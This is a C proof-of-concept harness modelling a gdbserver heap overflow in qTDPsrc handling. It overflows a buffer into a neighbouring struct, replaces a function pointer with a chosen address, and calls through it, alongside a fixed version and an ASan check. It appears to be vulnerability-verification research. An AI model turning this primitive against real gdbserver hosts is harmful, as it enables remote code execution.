/* Extracted model of gdbserver cmd_qtdpsrc — CVE-2026-121997.
 *
 * Source-bound primitive, quoted from Red Hat Bugzilla 2565679 comment 0
 * (sourceware gitweb returned HTTP 503 on every attempt; this is an extracted
 * model, NOT pinned upstream bytes):
 *
 *   "allocates xmalloc(slen+1) sized by the packet's declared slen field,
 *    but calls hex2bin(packet, src, strlen(packet)/2) using the actual hex
 *    data length independently. When actual data exceeds declared slen,
 *    hex2bin overflows the heap buffer by the difference with
 *    attacker-controlled content."
 *
 * The advisory further states the overflow corrupts
 * process_info_private::thread_db, replacing td_ta_map_lwp2thr_p with an
 * attacker-chosen address, and that a following qGetTLSAddr packet calls
 * through the forged pointer (RIP control claim, NOT reproduced here).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static int
hexval (char c)
{
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

/* Model of gdbserver's RSP hex2bin: writes exactly len decoded bytes,
   with no knowledge of the destination allocation's size. */
static size_t
hex2bin (const char *hex, unsigned char *out, size_t len)
{
  size_t i;
  for (i = 0; i < len; i++)
    out[i] = (unsigned char) ((hexval (hex[2 * i]) << 4)
			      | hexval (hex[2 * i + 1]));
  return i;
}

static char *
hexstr (const unsigned char *b, size_t n)
{
  static const char d[] = "0123456789abcdef";
  char *s = malloc (2 * n + 1);
  size_t i;
  for (i = 0; i < n; i++)
    {
      s[2 * i] = d[b[i] >> 4];
      s[2 * i + 1] = d[b[i] & 15];
    }
  s[2 * n] = '\0';
  return s;
}

struct process_info_private
{
  void (*td_ta_map_lwp2thr_p) (void);
  uint64_t stamp;
  uint64_t pad;
};

static void
benign_marker (void)
{
  puts ("MARKER EXECUTED: chosen td_ta_map_lwp2thr_p reached");
}

static void
original_dummy (void)
{
  puts ("ORIGINAL FUNCTION (should not be reached)");
}

/* Vulnerable sequence: allocation sized by declared slen, copy sized by
   actual hex length.  A guard follows src so the write never reaches the
   top chunk; it models a live gdbserver with other live heap objects. */
static unsigned char *
cmd_qtdpsrc (const char *packet, size_t declared_slen)
{
  size_t actual = strlen (packet) / 2;
  unsigned char *src = malloc (declared_slen + 1);
  unsigned char *guard = malloc (128);
  (void) guard;
  if (!src) exit (2);
  memset (src, 0, declared_slen + 1);
  hex2bin (packet, src, actual);
  return src;
}

/* Fixed control: reject the mismatch before allocation/copy. */
static unsigned char *
cmd_qtdpsrc_fixed (const char *packet, size_t declared_slen)
{
  size_t actual = strlen (packet) / 2;
  if (actual > declared_slen)
    {
      puts ("FIXED REJECT: actual > declared");
      return NULL;
    }
  unsigned char *src = malloc (declared_slen + 1);
  if (!src) exit (2);
  memset (src, 0, declared_slen + 1);
  hex2bin (packet, src, actual);
  return src;
}

static int
rung1 (void)
{
  const size_t declared = 8;
  unsigned char body[32];
  size_t i;
  for (i = 0; i < sizeof body; i++) body[i] = (unsigned char) (0xa0 + i);
  char *pkt = hexstr (body, sizeof body);
  size_t actual = strlen (pkt) / 2;
  unsigned char *src = cmd_qtdpsrc (pkt, declared);
  size_t first_oob = declared + 1;
  size_t oob = actual - first_oob;
  printf ("RUNG1 declared=%zu actual=%zu oob_writes=%zu first_oob=%zu last_oob=%zu\n",
	  declared, actual, oob, first_oob, actual - 1);
  printf ("RUNG1 src[8]=%02x src[9]=%02x src[31]=%02x\n",
	  src[8], src[9], src[31]);
  return (actual == 32 && oob == 23 && src[9] == 0xa9 && src[31] == 0xbf) ? 0 : 1;
}

/* src's 9-byte request occupies a 32-byte glibc chunk; pip follows it,
   so writing at delta reaches pip's first member with chosen bytes. */
static int
overflow_neighbour (int execute)
{
  const size_t declared = 8;
  const uint64_t stamp = 0x1122334455667788ULL;
  unsigned char *src = malloc (declared + 1);
  struct process_info_private *pip = malloc (sizeof *pip);
  unsigned char *guard = malloc (128);  /* keep top chunk out of the write path */
  (void) guard;
  if (!src || !pip) exit (2);
  memset (src, 0, declared + 1);
  memset (pip, 0, sizeof *pip);
  pip->td_ta_map_lwp2thr_p = original_dummy;
  pip->stamp = 0xdeadbeefdeadbeefULL;

  size_t delta = (unsigned char *) pip - src;
  if (delta < declared + 1) { printf ("NEIGHBOUR delta=%zu TOO SMALL\n", delta); return 1; }
  uintptr_t addr = (uintptr_t) &benign_marker;
  unsigned char *body = malloc (delta + 16);
  memset (body, 0xcc, delta + 16);
  memcpy (body + delta, &addr, 8);
  memcpy (body + delta + 8, &stamp, 8);
  char *pkt = hexstr (body, delta + 16);
  size_t actual = strlen (pkt) / 2;
  hex2bin (pkt, src, actual);

  int fn_ok = pip->td_ta_map_lwp2thr_p == (void (*)(void)) addr;
  int stamp_ok = pip->stamp == stamp;
  printf ("RUNG2 delta=%zu declared=%zu actual=%zu oob_writes=%zu fn_changed=%d stamp_changed=%d\n",
	  delta, declared, actual, actual - (declared + 1), fn_ok, stamp_ok);
  printf ("RUNG2 pip_fn=%p chosen=%p pip_stamp=%016llx chosen_stamp=%016llx\n",
	  (void *) pip->td_ta_map_lwp2thr_p, (void *) addr,
	  (unsigned long long) pip->stamp, (unsigned long long) stamp);
  if (execute && fn_ok) pip->td_ta_map_lwp2thr_p ();
  printf ("RUNG4 chosen_value_control=%s\n",
	  (fn_ok && stamp_ok && execute) ? "ESTABLISHED-IN-HARNESS" : "NOT_ESTABLISHED");
  return (fn_ok && stamp_ok) ? 0 : 1;
}

int
main (int argc, char **argv)
{
  const char *mode = argc > 1 ? argv[1] : "all";
  int rc = 0;
  if (!strcmp (mode, "rung1") || !strcmp (mode, "all")) rc |= rung1 ();
  if (!strcmp (mode, "rung2") || !strcmp (mode, "all")) rc |= overflow_neighbour (0);
  if (!strcmp (mode, "rung4") || !strcmp (mode, "all")) rc |= overflow_neighbour (1);
  if (!strcmp (mode, "rung3"))
    {
      /* ASan build: same two-line defect, expected to abort with a report. */
      const size_t declared = 8;
      unsigned char body[32];
      size_t i;
      for (i = 0; i < sizeof body; i++) body[i] = (unsigned char) (0xa0 + i);
      char *pkt = hexstr (body, sizeof body);
      puts ("RUNG3 entering vulnerable hex2bin under ASan");
      cmd_qtdpsrc (pkt, declared);
      puts ("RUNG3 UNEXPECTED: no ASan report");
      return 1;
    }
  if (!strcmp (mode, "fixed") || !strcmp (mode, "all"))
    {
      unsigned char body[32];
      size_t i;
      for (i = 0; i < sizeof body; i++) body[i] = (unsigned char) (0xa0 + i);
      char *pkt = hexstr (body, sizeof body);
      unsigned char *src = cmd_qtdpsrc_fixed (pkt, 8);
      printf ("FIXED src_null=%d oob_writes=0\n", src == NULL);
      if (src != NULL) rc |= 1;
    }
  return rc;
}
